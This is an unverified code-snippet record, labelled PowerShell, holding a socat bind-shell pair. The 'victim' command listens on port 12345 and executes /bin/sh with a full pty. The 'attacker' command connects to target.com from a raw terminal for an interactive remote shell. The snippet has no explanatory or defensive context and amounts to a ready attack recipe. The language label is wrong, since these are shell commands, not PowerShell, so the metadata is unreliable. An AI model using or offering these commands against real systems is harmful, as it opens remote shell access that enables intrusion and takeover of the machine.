---
id: fd9843c8-45e3-44c8-8781-f53005717103
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:08.899762+00:00'
updated_at: '2023-04-10T20:21:16.981833+00:00'
---

# Code Snippet fd9843c8

**Language**: Powershell

```powershell
user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```
